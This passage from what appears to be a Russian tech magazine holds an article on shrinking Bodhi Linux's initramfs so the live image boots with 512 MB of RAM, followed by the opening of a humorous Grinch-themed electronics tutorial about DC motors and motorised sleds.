могут потом работать в гораздо более скромном окружении?!
   Для ответа на этот вопрос надо посмотреть, как происходит загрузка Bodhi
Linux с дистрибутивного носителя (на схеме ниже). Первым делом загрузчик
операционной системы помещает с носителя в оперативную память ядро Linux
/casper/vmlinuz с упакованным содержимым минимальной файловой сис‐
темы (МФС) /casper/initrd.gz, формирует окружение ядра с параметрами
командной строки и передает ядру управление. Ядро получает параметры
из окружения и принимает их к сведению, определяет и инициализирует
основное оборудование компьютера, после чего распаковывает МФС и запус‐
кает процесс  init, текст сценария которого содержится в файле /init рас‐
пакованной файловой системы.





                 Использование ОЗУ при загрузке Bodhi Linux

Основная задача процесса init на данном этапе — отыскать на носителе образ
основной файловой системы /casper/filesystem.squashfs, переключиться
на него с МФС и запустить свое продолжение. Для этого могут потребоваться
модули ядра с драйверами устройства, которые обслуживают носитель с дис‐
трибутивом и обеспечивают понимание его файловой системы. Эти драйверы,
если они не встроены в ядро, должны быть доступны из МФС.


        WWW

                        •Using the initial RAM disk (initrd)
                       •Ramfs, rootfs and initramfs


После переключения на основную файловую систему МФС больше не требует‐
ся, и занимаемая ей оперативная память освобождается. Файловая система
squashfs позволяет работать с ней в режиме «только чтение» непосредственно
из файла с образом. С этого момента оперативная память используется
в основном для следующих целей:
 • хранения кода выполняющихся процессов и обрабатываемых ими данных;
 • хранения изменений, которые происходят в основной файловой системе
   (это реализуется с помощью механизма overlayfs: дерево каталогов вир‐
   туальной файловой системы tmpfs, созданной в оперативной памяти, нак‐
   ладывается на дерево каталогов основной файловой системы squashfs);
 • прочих системных кешей и буферов.


        WWW

                         •Overlay Filesystem
                      •Tmpfs


На каком же этапе возникает проблема в последовательности этих шагов?
Чтобы узнать это, загрузим Bodhi Linux в виртуальной машине с 512 Мбайт
ОЗУ. И почти сразу после того, как мы в меню загрузки выберем Try Bodhi
или Install Now, получим черный экран смерти со множеством диагностических
сообщений. Несмотря на то что заключительный вердикт звучит как «Kernel
panic - not syncing: No working init found» («Ядро остановлено — не синхронизи‐
ровано: не найден рабочий init»), суть проблемы отражает самая первая стро‐
ка: «Initramfs unpacking  failed: write error» («Сбой при распаковке initramfs:
ошибка записи»). Это значит, что ядро не смогло распаковать МФС из initrd.
gz из‑за нехватки оперативной памяти.


ПРИЧИНА ПРОБЛЕМЫ

Почему же памяти не хватило? По большому счету на этом этапе в ОЗУ
находятся ядро и заархивированная МФС. Во время загрузки ядро Linux
активно выделяет, перемещает и освобождает области памяти. Если ты
не разработчик ядра, уследить за всеми выполняемыми действиями довольно
сложно.  К  счастью,  когда  ситуация  стабилизируется,  ядро  формирует
информационное сообщение и узнать «окончательный счет» можно с помощью
команды


$ dmesg | grep ']\sMemory'

Ниже  приведены  результаты ее выполнения для диапазона оперативной
памяти от 384 до 1024 Мбайт с шагом 128 Мбайт:


 384 Мб: [ ] Memory: 263248K/392760K available (14339K kernel
code, 2400K rwdata, 5008K rodata, 2732K init, 4972K bss, 129512K
reserved, 0K cma-reserved)
 512 Мб: [ ] Memory: 392272K/523832K available (14339K kernel
code, 2400K rwdata, 5008K rodata, 2732K init, 4972K bss, 131560K
reserved, 0K cma-reserved)
 640 Мб: [ ] Memory: 520528K/654904K available (14339K kernel
code, 2400K rwdata, 5008K rodata, 2732K init, 4972K bss, 134376K
reserved, 0K cma-reserved)
 768 Мб: [ ] Memory: 649552K/785976K available (14339K kernel
code, 2400K rwdata, 5008K rodata, 2732K init, 4972K bss, 136424K
reserved, 0K cma-reserved)
 896 Мб: [ ] Memory: 778576K/917048K available (14339K kernel
code, 2400K rwdata, 5008K rodata, 2732K init, 4972K bss, 138472K
reserved, 0K cma-reserved)
1024 Мб: [ ] Memory: 907600K/1048120K available (14339K kernel
code, 2400K rwdata, 5008K rodata, 2732K init, 4972K bss, 140520K
reserved, 0K cma-reserved)

На основании этих сведений можно сделать вывод, что объем памяти, занима‐
емой процессом ядра с сегментами кода (kernel code), констант (rodata),
изменяемых неинициализированных (rwdata) и инициализированных (bss) дан‐
ных постоянно и составляет 29 451 Кбайт или примерно 29 Мбайт. Объем
дополнительно резервируемой ядром памяти в некоторой степени зависит
от общего объема оперативной памяти компьютера, но в основном определя‐
ется размером файла initrd.gz. Можно сказать, что значение reserved равно
сумме размера процесса ядра (29 Мбайт), файла initrd.gz (87 Мбайт) и сис‐
темных структур (10–20 Мбайт).

Как считать память, если ее не хватило
Чтобы получить журнал сообщений ядра при 384 Мбайт и 512 Мбайт ОЗУ, ког‐
да ядро не может распаковать МФС, перенаправь консоль в последователь‐
ный порт ttyS0, добавив параметры ядра в командной строке загрузчика:


 console=ttyS0 console=tty0 ignore_loglevel


А сам  порт  перенаправляется в файл  настройкой  виртуальной машины
VirtualBox, как показано на рисунке.





В остальных случаях, когда оперативной памяти достаточно для распаковки
МФС, можно назначить прерывание процесса init после загрузки драйверов,
достаточных для монтирования накопителей. Для этого к параметрам ядра
надо добавить break=mount. Когда появится командная строка BusyBox, мож‐
но вручную примонтировать к МФС основной накопитель и сохранить на него
необходимые сведения.


Теперь мы можем  посчитать, что объем  свободной оперативной памяти
на данном этапе составляет 512 – 128 = 384 Мбайт. Это довольно много, если
учесть, что перед ядром стоит единственная задача распаковки МФС из сжа‐
того алгоритмом LZ4 архива. Сейчас самое время вспомнить, что в рас‐
пакованном виде эта файловая система занимает 242 Мбайт, и для ее хра‐
нения этот объем надо вычесть из имеющегося свободного пространства: 384
– 242 = 142 Мбайт. Но это все еще приличный запас.
   Распаковкой и одновременно формированием МФС занимается конечный
автомат, реализованный в модуле init/initramfs.c. Он по мере необходимости
резервирует буферную память, которая освобождается полностью только пос‐
ле завершения его работы. Поэтому в описываемых условиях свободная опе‐
ративная память исчерпывается в момент формирования 384/2 = 192 Мбайт
МФС из 242 Мбайт необходимых.


ПАРАДОКСАЛЬНАЯ ИДЕЯ

Что, если не архивировать cpio-блок с МФС? Идея парадоксальная, но тогда
ядру не придется выделять память для распаковки и дистрибутив запустится
на системах с 512 Мбайт ОЗУ. Естественно, у такого способа будут недос‐
татки. Во‑первых, размер образа увеличится на 242 – 83 = 159 Мбайт. Из‑за
этого может возрасти время загрузки, если носитель с образом не очень про‐
изводительный, например DVD-ROM или флешка USB 2.0.
  Но хуже всего то, что этот способ совершенно неработоспособен, потому
что из‑за увеличения файла initrd.gz объем свободной памяти сократится
на 159 Мбайт, после чего вместо 384 Мбайт останется 225 Мбайт, в которые
никак не сможет поместиться 242-мегабайтная МФС. А на самом деле ока‐
зывается, что перенос содержимого из cpio-блока в МФС тоже производится
через буферную память, что вызывает аварийное прерывание процесса после
обработки примерно 112 Мбайт. Поэтому надо искать другие пути.


ИЗУЧАЕМ СОСТАВ МИНИМАЛЬНОЙ ФС

Единственный  объект, модификация  которого может помочь  сэкономить
память на начальном этапе загрузки, — это МФС. Определить, какой объем
занимают ее части, нетрудно — достаточно выполнить внутри интересующих
каталогов команду


$ du -shm * | sort -rn | head

Она подсчитывает и наглядно показывает размеры подкаталогов в текущем
каталоге. В результате получилась карта самых крупных объектов МФС.





                   Элементы МФС с указанием их размера

Подавляющую долю МФС составляют бинарные файлы, предоставленные про‐
изводителями устройств, и модули ядра с драйверами устройств. Хорошо бы
узнать, из каких пакетов они появились:



  $ dpkg-query -S /lib/firmware
 wireless-regdb, linux-firmware, intel-microcode, amd64-microcode:
 /lib/firmware


  $ dpkg-query -S /lib/modules
 linux-modules-extra-5.4.0-72-generic, linux-modules-5.4.0-72-
 generic, linux-headers-5.4.0-72-generic: /lib/modules


Оказывается, источники той массы файлов, из‑за которых «распухает» initrd.
gz, — это всего несколько пакетов. Сгруппировать их по выполняемым фун‐
кциям и удалить лишние не выйдет. Оставим пока эту проблему и попробуем
выяснить, все ли эти пакеты необходимы для  начальной  загрузки ОС.
Для ответа на этот вопрос надо обратиться к сценарию /init, который
находится в корне МФС и координирует все выполняемые на этом этапе дей‐
ствия.


ИССЛЕДОВАНИЕ СЦЕНАРИЯ /INIT

Сначала этот сценарий инициализирует переменную окружения PATH, чтобы
обеспечить себе доступ к системным утилитам:


export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/
sbin:/bin

После этого он дополняет файловую систему каталогами, чтобы приблизить ее
к Filesystem Hierarchy Standard. Некоторые каталоги монтируются специальным
образом для отображения в них виртуальных файловых систем:


/dev
/root
/sys        <--- mount -t sysfs -o nodev,noexec,nosuid sysfs /sys
/proc       <--- mount -t proc -o nodev,noexec,nosuid proc /proc
/tmp
/var/lock
/dev        <--- mount -t devtmpfs -o noexec,nosuid,mode=0755
udev /dev
/dev/pts        <--- mount -t devpts -o noexec,nosuid,gid=5,
mode=0620 devpts /dev/pts

Затем  формируется  среда  окружения,  в  которой  отметим  переменную
RUNSIZE. Она  определяет  размер  оперативной  памяти,  который  будет
зарезервирован для виртуальной файловой системы /run. Значение этой
переменной извлекается из конфигурационного файла /conf/initramfs.conf
и по умолчанию составляет 10%.
   После  подключения  подпрограмм  из  библиотеки /script/functions
запускается цикл разбора параметров, переданных ядру Linux из командной
строки загрузчика:


for x in $(cat /proc/cmdline)
    case $x in
    ...
    ИмяПараметра=*)
        ИМЯПАРАМЕТРА="${x#ИмяПараметра=}"
        ;;
    ...
    initramfs.runsize=*)
        RUNSIZE="${x#initramfs.runsize=}"
        ;;
    boot=*)
        BOOT=${x#boot=}
        ;;
    break=*)
        break=${x#break=}
        ;;
    break)
        break=premount
        ;;
    ...
    esac
done

В основном он дополняет или изменяет переменные среды. Например,
на значение переменной RUNSIZE можно повлиять, указав параметр ядра
initramfs.runsize. Переменная BOOT — индикатор способа загрузки ОС:
local, nfs или casper. В дальнейшем она используется для подключения сце‐
нариев монтирования основной файловой системы в команде такого вида:


. /scripts/${BOOT}

С помощью параметра break можно из командной строки ядра указать точку
останова, которая прервет исполнение init и выдаст командную строку BusyBox
в среде минимальной файловой системы. Эта возможность реализуется фун‐
кцией maybe_break(), определенной в /script/functions, и я пользовался
ей для анализа распределения оперативной памяти на ранней стадии загрузки
ядра. Еще можно обратить внимание на параметр root, который может при‐
нять значение nfs для выполнения сетевой загрузки.
   Далее происходит монтирование файловой системы /run, содержимое
которой будет храниться в файловом кеше операционной системы, то есть
занимать место в оперативной памяти:


mount -t tmpfs -o "nodev,noexec,nosuid,size=${RUNSIZE:-10%},
mode=0755" tmpfs /run
mkdir -m 0700 /run/initramfs


             INFO

                    На  самом  деле  объем  оперативной  памяти,
                          резервируемой для  файловой  системы /run,
                           никакого отношения к вопросу, который мы изу‐
                        чаем, не имеет. Ведь сценарий /init начнет
                     свою работу только после того, как МФС будет
                          готова. Но о нем стоит помнить, если возникнут
                        проблемы на следующем шаге загрузки.


Дальше загружаются модули ядра, перечисленные в конфигурационном файле
/conf/modules, а именно dm-mod и dm-mirror. С помощью утилиты modinfo
мы можем узнать, что модуль dm-mod встроен в ядро (filename: builtin),
а dm-mirror находится вот в этом файле:


/lib/modules/5.4.0-72-generic/kernel/drivers/md/dm-mirror.ko

В его зависимостях перечислены модули dm-region-hash.ko и dm-log, находя‐
щиеся по тому же пути.
   Потом сценарий init с помощью подпрограммы run_scripts, определен‐
ной в /script/functions, выполняет в требуемой последовательности сце‐
нарии из каталогов /scripts/init-top и /scripts/init-premount. Резуль‐
тат — подключение драйверов generic-ide, инициализация консоли и фрей‐
мбуфера, запуск подсистемы управления устройствами udev и графической
заставки plymouth.
   После загрузки подпрограмм из файлов /scripts/local и /scripts/
casper (потому что в командной строке ядра указан параметр boot=casper)
с их помощью подключается драйвер RAID, модули поддержки файловых сис‐
тем и шифрования корневой файловой системы.
   Наконец, выполняется функция mountroot (), определенная в файле /
scripts/casper  (и  переопределившая таковые из /scripts/local и /
scripts/nfs). Она монтирует основную файловую систему к каталогу МФС /
root, который задан переменной окружения rootmnt. Если монтирование
основной файловой системы прошло успешно, на нее переносятся виртуаль‐
ные файловые системы, содержащие сформировавшийся к текущему времени
контекст:


mount -n -o move /run ${rootmnt} /run
mount -n -o move /sys ${rootmnt} /sys
mount -n -o move /proc ${rootmnt}/proc

Последний шаг — это переключение корня на основную файловую систему
и передача управления программе /sbin/init, если иное не было определе‐
но параметром ядра init.


             INFO

                         Возможно, тебе уже спасал жизнь прием аварий‐
                      ной загрузки в командную строку, который сос‐
                        тоит в указании параметра init=/bin/sh. Если
                          нет, то держи на вооружении!


Подведем итог. На начальном этапе загрузки операционной системы могут
потребоваться:
 • модули ядра с драйверами интерфейса и носителя, на котором размещен
   дистрибутив Bodhi Linux с образом основной файловой системы /casper/
  filesystem.squashfs ;
 • драйверы видеоадаптера для отображения красочной графической  зас‐
   тавки, которая сопровождает загрузку;
 • модули ядра с драйверами сетевых устройств, в том числе с бинарными
   блоками Wi-Fi, для сетевой загрузки.

Куда сложнее будет ответить на вопрос, от чего на этом этапе можно отказать‐
ся.


АГРЕССИВНЫЙ ПОДХОД

Bodhi  Linux  позиционируется  как  дистрибутив для  бытового применения
рядовыми  пользователями,  поэтому не  кажется большим  преступлением
убрать из него сетевые драйверы и таким образом лишить его возможности
сетевой загрузки. Ради установки на компьютер с 512 Мбайт оперативной
памяти можно пожертвовать и эстетической стороной процесса, отказавшись
от графической заставки.
   Такие допущения  позволяют с относительно чистой совестью удалить
из МФС самые объемные  каталоги. Для  этого после анализа структуры
initrd.gz и извлечения МФС в каталог initramfs надо выполнить такие
команды:


$ rm -fr initramfs/usr/lib/firmware/{netronome,amdgpu,radeon,
liquidio,i915}
$ rm -fr initramfs/usr/lib/modules/5.4.0-72-generic/kernel/
drivers/{net,gpu,scsi}



IDE CDROM в Linux поддерживается через подсистему SCSI. Так почему был
удален каталог с драйверами этой подсистемы?
  С одной  стороны,  команда dmesg  |  grep  'scsi'  показывает,  что
интерфейсы SCSI действительно используются:


 [ ] scsi host0: ahci
 [ ] scsi host1: ahci
 ...
 [ ] sr 1:0:0:0: Attached scsi CD-ROM sr0
 [ ] sr 1:0:0:0: Attached scsi generic sg1 type 5


С другой стороны, команда lsmod не показывает загруженных SCSI-модулей,
что намекает на их наличие в ядре.



Такая чистка не помешает использовать видеоадаптеры или SCSI RAID после
установки операционной системы на компьютер: все эти драйверы есть
в образе основной файловой системы. Они будут недоступны лишь на раннем
этапе загрузки с дистрибутивного носителя — до переключения с МФС
на основную файловую систему. Один из этапов установки операционной сис‐
темы — генерация файла /boot/initrd.img, который содержит все необ‐
ходимые для работы оборудования компоненты.
   После чистки размер МФС сократился на 136 Мбайт и составил 103 Мбайт,
а упакованный файл initrd.gz стал занимать 47 Мбайт. Образ Bodhi Linux
с таким файлом работает на компьютере с 512 Мбайт оперативной памяти
как в демонстрационном режиме (Try Bodhi), так и в режиме установки опе‐
рационной системы (Install Now) на жесткий диск. Распределение оперативной
памяти выглядит следующим образом:


[ ] Memory: 433588K/523832K available (14339K kernel code, 2400K
rwdata, 5008K rodata, 2732K init, 4972K bss, 90244K reserved, 0K
cma-reserved)




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИТРЮКИ
               LINUX
          НА ДИЕТЕ
                      УМЕНЬШАЕМ ТРЕБОВАНИЯ
                                    BODHI LINUX
                           К ОПЕРАТИВНОЙ ПАМЯТИ




При загрузке будет только текстовая заставка вместо графической, но это
никак не влияет на работу дистрибутива. Драйверы видеоадаптера активиру‐
ются после переключения на основную файловую систему, и графическое
окружение благополучно инициализируется.





  Графическая (слева) и текстовая (справа) заставки при загрузке Bodhi
  Linux

При уменьшении объема памяти до 384 Мбайт удалось успешно загрузиться
в демонстрационном режиме, но процедура установки прервалась на этапе
разметки накопителя.


ДЕЛИКАТНЫЙ ПОДХОД

Несмотря на сравнительный успех описанного подхода, хотелось бы иметь
более  авторитетную  аргументацию при  отборе  элементов,  исключаемых
из МФС. Посмотрим еще раз на состав пакетов, которые внесли вклад
в каталог модулей ядра. На себя обращает внимание linux-modules-extra-
5.4.0-72-generic. Слово extra намекает, что в нем собраны дополнения
к пакету linux-modules-5.4.0-72-generic, без которых, возможно, удастся
обойтись. Но удалить этот пакет средствами dpkg не получится, потому что
в целях минимизации МФС разработчики исключили из нее базу данных
со сведениями об установленных пакетах (обычно она находится в каталоге /
var/lib/dpkg).
   Будем действовать следующим образом. Сначала получим из загруженной
в демонстрационном режиме операционной системы Bodhi Linux список фай‐
лов, входящих в состав пакета linux-modules-extra-5.4.0-72-generic:


$ dpkg -L linux-modules-extra-5.4.0-72-generic | grep '^/lib/
modules/.*\.ko$' > list-extra.txt

Потом по составленному списку можно удалить из МФС модули ядра, отно‐
сящиеся к этому пакету. Здесь, как и ранее, предполагается, что МФС
находится в каталоге initramfs.


$ cat list-extra.txt | while read module; do rm initramfs$module;
done

При выполнении этой команды ты увидишь много сообщений об отсутству‐
ющих  файлах, потому что пакет linux-modules-extra-5.4.0-72-generic
представлен в МФС частично. Но после завершения можно убедиться в том,
МФС стала значительно компактнее:


$ du -sh initramfs
179M    initramfs

А содержимое каталога lib/firmware удалим полностью:


$ rm -fr initramfs/lib/firmware/*

Это сократит МФС до разумного размера в 86 Мбайт. Собранный с такой
МФС файл initrd.gz занимает 37 Мбайт, а образ с ним загружается точно так
же, как и в рассмотренном выше случае. Память распределяется так:


[ ] Memory: 441968K/523832K available (14339K kernel code, 2400K
rwdata, 5008K rodata, 2732K init, 4972K bss, 81864K reserved, 0K
cma-reserved)


АВТОМАТИЧЕСКАЯ СБОРКА INITRD.GZ

А что, если воспользоваться файлом initrd.img, который автоматически фор‐
мируется в ходе  установки операционной системы на компьютер? Взять
и просто заменить этим файлом initrd.gz на носителе с дистрибутивом
нельзя, ведь отличия между МФС установленной системы и дистрибутива зак‐
лючаются не только в составе драйверов, но и в наборе программ и текстах
сценариев. Однако можно извлечь из него каталоги lib/firmware и lib/
modules и поместить их в МФС.
   Вот незадача! Если попытаться загрузить систему с изготовленного таким
методом образа, работа сценария init останавливается с сообщением


/cow format specified as 'overlay' and no support found

Эту ошибку выводит следующая строка сценария /scripts/casper:


modprobe "${MP_QUIET}" -b overlay || panic "/cow format specified
as 'overlay' and no support found"

Оказывается,  сценарий не может  загрузить модуль  файловой  системы
overlayfs, который не используется в установленной операционной системе,
но в демонстрационном режиме необходим для образования изменяемого
слоя над основной файловой системой, которая доступна только для чтения.
Для решения проблемы надо записать каталог /lib/modules/5.4.0-72-
generic/kernel/fs/overlayfs в МФС, после чего обновить зависимости
с помощью последовательности команд:


$ sudo chroot initramfs /bin/ash
# ln -s /bin/kmod /usr/sbin/depmod
# depmod
# exit

Если теперь пересобрать initrd.gz, то образ с ним будет рабочим, но,
во‑первых, при  загрузке по‑прежнему  отсутствует  графическая  заставка,
а во‑вторых, размер МФС получился не таким уж компактным: 172 Мбайт
до упаковки и 63 Мбайт — после. Память при этом распределяется так:


[ ] Memory: 417248K/523832K available (14339K kernel code, 2400K
rwdata, 5008K rodata, 2732K init, 4972K bss, 106584K reserved, 0K
cma-reserved)


           WARNING

                          Перед внесением изменений в конфигурацион‐
                     ные файлы не забудь  сделать их  резервные
                         копии, а после генерации initrd.img восста‐
                       нови исходную конфигурацию!


Справиться с обоими недостатками и сократить объем работы можно, если
сгенерировать файл initrd.img  средствами пакета  initramfs-tools  после
небольшой подготовки. Во‑первых, давай явным образом пропишем в файле /
etc/initramfs-tools/modules список модулей, которые загружены (а зна‐
чит,  требуются) при  работе  Bodhi  Linux  в  демонстрационном  режиме.
Для получения такого списка надо (в демонстрационном режиме) выполнить
команду


$ lsmod | tail -n +2 | cut -f1 -d ' ' > modules.txt

Во‑вторых, чтобы в initrd.img попали только те драйверы, которые нужны
для  поддержки  оборудования  конкретного  компьютера,  в  файл  /etc/
initramfs-tools/initramfs.conf внесем исправление:


MODULES=dep

Теперь можно запустить формирование файла initrd.img командой


$ mkinitramfs -o initrd.img

Осталось только перенести из него каталоги lib/firmware и lib/modules
в МФС. Специальной заботы по поводу overlayfs в этом случае не требуется,
потому что модуль присутствует в сформированном списке.


           WARNING

                     При извлечении файловой системы из initrd.
                   img будь внимателен: он состоит из двух частей,
                       а не из  трех. Сценарий, запущенный с  кон‐
                         фигурационным   параметром  MODULES=dep,
                           оставит   микрокод   только  того   процессора,
                      которым   оснащен   работающий   компьютер.
                    А каталог lib/firmware в извлеченной из него
                        файловой системе может вообще отсутствовать.


Образ, в который был помещен initrd.gz с МФС, подготовленной описан‐
ным способом, показал наилучший результат. Во‑первых, МФС получилась
самая компактная: 55 Мбайт в распакованном виде и 26 Мбайт в упакованном.
Красноречивее всего об этом говорит распределение памяти:


[ ] Memory: 451928K/523832K available (14339K kernel code, 2400K
rwdata, 5008K rodata, 2732K init, 4972K bss, 71904K reserved, 0K
cma-reserved)

Во‑вторых, благодаря включению в МФС драйверов, специфичных для компь‐
ютера, при загрузке демонстрируется графическая заставка (ура, мы сделали
это!).
   Такой способ оптимизации МФС лучше всего подходит для создания вир‐
туальных машин с единой конфигурацией. Увы, созданный таким методом
носитель с дистрибутивом не смог отыскать основную файловую систему
на реальных компьютерах, в отличие от рассмотренных раньше вариантов.


ВЫВОДЫ

Некоторые современные дистрибутивы GNU/Linux завышают «порог входа»:
предъявляют более высокие требования к оперативной памяти на этапе запус‐
ка установки или демонстрационного режима, чем на самом деле требуется
для работы ОС. Причина, с одной стороны, в том, что при извлечении
минимальной файловой системы из блока cpio ядро нерационально использует
оперативную память, а с другой — в избыточном наборе драйверов, которые
разработчики дистрибутивов включают в минимальную файловую систему.
  Мы проанализировали состав минимальной файловой системы и нашли
несколько способов оптимизировать его. Описанные приемы позволяют так
модифицировать образ Bodhi Linux 6.0, чтобы он был пригоден для установки
операционной системы на компьютеры с 512 Мбайт оперативной памяти.
Это может оказаться полезно при создании однотипных виртуальных машин
или для продления срока службы устаревшей техники.
   Надо отметить, что использованный в статье прием с полной очисткой
содержимого каталога /lib/firmware может привести к проблеме в случае,
если бинарный блок требуется драйверу, интегрированному в ядро. Впрочем,
на практике с этим столкнуться не пришлось.


ПРИЛОЖЕНИЕ 1. АНАЛИЗИРУЕМ СТРУКТУРУ INITRD.GZ

Файл initrd.gz из образа Bodhi Linux 6.0 состоит из трех частей: микрокода
для процессоров AMD, микрокода для процессоров Intel и собственно упа‐
кованной минимальной файловой системы. Чтобы добраться до этой ФС, нуж‐
но узнать, по какому смещению от начала файла она находится. А для этого
придется последовательно измерить каждую предыдущую часть. Приступим:



  $ file initrd.gz
 initrd.gz: ASCII cpio archive (SVR4 with no CRC)


Первая часть — это архив формата cpio. Посмотрим его содержимое, чтобы
определить размер:



  $ cpio -it < initrd.gz
  .
 kernel
 kernel/x86
 kernel/x86/microcode
 kernel/x86/microcode/AuthenticAMD.bin
 62 блока


Из вывода команды понятно, что мы просмотрели микрокод для процессоров
AMD, размер которого 62 блока по 512 байт. Отступаем на 62 блока от начала
файла initrd.gz и определяем формат следующей части:



  $ dd if=initrd.gz bs=512 skip=62 | file -
 /dev/stdin: ASCII cpio archive (SVR4 with no CRC)


Снова перед нами архив формата cpio, который мы можем просмотреть:



  $ dd if=initrd.gz bs=512 skip=62 | cpio -it
 kernel
 kernel/x86
 kernel/x86/microcode
 kernel/x86/microcode/.enuineIntel.align.0123456789abc
 kernel/x86/microcode/GenuineIntel.bin
 6760 блоков


Оказывается, это микрокод для процессоров Intel, который значительно боль‐
ше — 6760 блоков. Вычисляем смещение к следующей части:


 echo((6760+62))
 6822


Что же представляет собой третий блок?



  $ dd if=initrd.gz bs=512 skip=6822 | file -
 /dev/stdin: LZ4 compressed data (v0.1-v0.9)


Перед нами данные, сжатые алгоритмом LZ4. А что, собственно, сжато?



  $ dd if=initrd.gz bs=512 skip=6822 | unlz4 | file -
 /dev/stdin: ASCII cpio archive (SVR4 with no CRC)


А сжат архив cpio, содержимое которого мы можем увидеть после пред‐
варительной распаковки:



  $ dd if=initrd.gz bs=512 skip=6822 | unlz4 | cpio -it
  .
 bin
 conf
 conf/arch.conf
 ...
 var/lib
 var/lib/dhcp
 474504 блока


Это как раз то, что нам нужно, — минимальная файловая система. Теперь
у нас достаточно информации, чтобы ее извлечь.


ПРИЛОЖЕНИЕ 2. ИЗВЛЕКАЕМ МИНИМАЛЬНУЮ ФАЙЛОВУЮ
СИСТЕМУ

Сведений, собранных при анализе файла initrd.gz, хватит, чтобы можно было
сразу приступить к извлечению минимальной файловой системы. Но уместно
вспомнить, что потом нам надо будет собрать файл initrd.gz после внесения
изменений в минимальную файловую систему. Поэтому, пока еще свежи
в памяти сведения о структуре этого файла, сохраним первые его части
в отдельных файлах initrd.p1 и initrd.p2, которые затем будем не задумываясь
использовать для сборки:



  $ dd if=initrd.gz bs=512 count=62 of=initrd.p1
 62+0 записей получено
 62+0 записей отправлено
 31744 байт (32 kB, 31 KiB) скопирован


  $ dd if=initrd.gz bs=512 skip=62 count=6760 of=initrd.p2
 6760+0 записей получено
 6760+0 записей отправлено
 3461120 байт (3,5 MB, 3,3 MiB) скопирован


А теперь можно извлечь минимальную файловую систему. Для этого надо соз‐
дать каталог, в который будут помещены ее файлы, сделать его текущим, пос‐
ле чего набрать ту же команду, которая недавно была использована для прос‐
мотра, заменив на ней ключ t ключом m:



  mkdir initramfs && cd initramfs
  dd if=../initrd.gz bs=512 skip=6822 | unlz4 | cpio -im
 171678+1 записей получено
 171678+1 записей отправлено
 87899275 (88 MB, 84 MiB) скопирован
 474504 блока


После извлечения можно выйти из каталога и оценить размер его содер‐
жимого:



  $ cd .. && du -sh initramfs
 239M    initramfs


Почти 240 Мбайт — действительно, это серьезная нагрузка на оперативную
память. Наверняка среди этой массы есть много того, что не является абсо‐
лютно необходимым на начальной фазе загрузки операционной системы.
А значит, ненужные элементы можно удалить, после чего произвести сборку
файла initrd.gz с облегченной минимальной файловой системой.


ПРИЛОЖЕНИЕ 3. СОБИРАЕМ ФАЙЛ INITRD.GZ

Собирать файл initrd.gz будем в порядке, обратном тому, в котором раз‐
бирали. Сначала надо сформировать его третью часть init.p3, упаковав
модифицированную минимальную ФС:


$ cd initramfs
$ find . | cpio -H newc -o | lz4 -l8 > ../initrd.p3


             INFO

                   В начале своих экспериментов я воспользовался
                          утилитой  lz4 без  параметров и при  загрузке
                        с  модифицированного  дистрибутива  получил
                        сообщение  об  ошибке   «Initramfs  unpacking
                              failed». Из документации я узнал, что ключ -l
                           задает подходящую степень сжатия.


Осталось соединить три части (первые две из них с микрокодом процессоров
достались в наследство) в новый файл initrd.gz:


$ cd ..
$ cat initrd.p1 initrd.p2 initrd.p3 > initrd.gz

После замены файла initrd.gz на носителе с дистрибутивом не забудь подсчи‐
тать его контрольную сумму и внести исправление в файл /md5sum.txt. Тогда
при загрузке не увидишь предупреждение о том, что носитель поврежден.
GEEK




 НОВОГОДНИЙ
  ПЕРЕПОЛОХ

       ИЗУЧАЕМ ЭЛЕКТРОНИКУ
           С ГРИНЧЕМ





Бип‑хо‑хо‑бип!             Прием‑прием...
Наконец‑то   мне   удалось    связаться
с тобой, приспешник! Это я, Гринч. Я уже
украл Рождество, а теперь похищу и ваш
любимый Новый год! Нет времени на воп‐            prostorosty                                                                                                  I'm just a TechnoFreak.
росы, у нас много работы. Мы сделаем        7753313vv@gmail.com
ловушку  на  Деда  Мороза,   украдем
новогоднюю елку и научимся хакать умные
гирлянды! Мне уже удалось взломать сайт
«Хакера» и запостить эту статью. Читай
скорее, пока не пришел админ!


Прежде чем переходить к пакостям, нам с тобой надо будет как следует под‐
готовиться. Я нашел на «Хакере» несколько статей по электронике и пайке,
знания откуда тебе сегодня пригодятся. Прочитай их, ведь нам предстоит
работать с электроникой, иначе праздник останется на своем месте!


             INFO

                       •Цифровая   электроника  с  самого  начала.
                         Собираем схемы на MOSFET-транзисторах
                       •Бунт    многоножек.   Собираем   устройство
                         с интегральными микросхемами
                        •Время паять! Подбираем инструменты и осва‐
                       иваем искусство пайки
                            •Искусство пайки. Выбираем инструменты, при‐
                       боры и расходники для домашней мастерской


Прочитал? Горжусь! Начнем же немедленно подготовку к самому ответствен‐
ному делу твоей жизни.


ГРИНЧУ НУЖЕН ТРАНСПОРТ

Тебе предстоит сконструировать для меня механические сани, прямо как у
Санты. Но если этот пузатый лопух на них подарки развозит, то я буду скла‐
дывать в них подарки украденные. Только без оленей — не будем уподоблять‐
ся Клаусу и мучить бедных зверят, мои сани должны быть самоходными.
   Для изготовления моих саней тебе потребуется электродвигатель. С ним ты
наверняка сталкивался, но сейчас я расскажу о нем подробнее.


Электродвигатель
Как‑то мой старый товарищ Майкл Фарадей обнаружил, что при взаимодей‐
ствии магнита и электрического тока в проводнике может возникнуть неп‐
рерывное вращение. На этом и основывается принцип работы электродвигате‐
ля.





                Принцип работы двигателя постоянного тока

Расположив в магнитном поле вертикально рамку из проводника и пустив
по ней ток, мы сможем создать электромагнитное поле вокруг проводника.
Оно будет взаимодействовать с полюсами магнитов, и в итоге от одного рамка
оттолкнется, а к другому притянется. Так рамка дойдет до горизонтального
положения, в котором магнитное поле перестанет действовать на магнит. Что‐
бы вращение продолжилось, необходимо добавить еще одну рамку под углом
либо поменять направление тока в рамке в нужный момент. На гифке выше
это делается при помощи двух полуколец, к которым подключены контактные
пластины от батарейки. И после совершения полуоборота меняется поляр‐
ность и вращение не прекращается.
   Существует немало разных типов электромоторов, но нам потребуется дви‐
гатель постоянного тока. Переключение фаз здесь происходит прямо внутри
двигателя.  Благодаря  этому  он  может  питаться  и  постоянным  током,
и переменным. Постоянный ток с течением времени не изменяется по величи‐
не и направлению, а переменный — изменяется.





                         Электродвигатель на схеме


Продолжаем делать сани
Санями мы будем управлять с расстояния, правда небольшого. Не станем наг‐
ружаться дистанционным управлением (может, сделаем это в следующем
году). А сейчас обойдемся проводным. Изготовим простой пульт из перек‐
лючателей и по длинному проводу будем рулить нашими санями.
  Но сначала нам потребуются сами сани. Не на голых же моторах ездить,
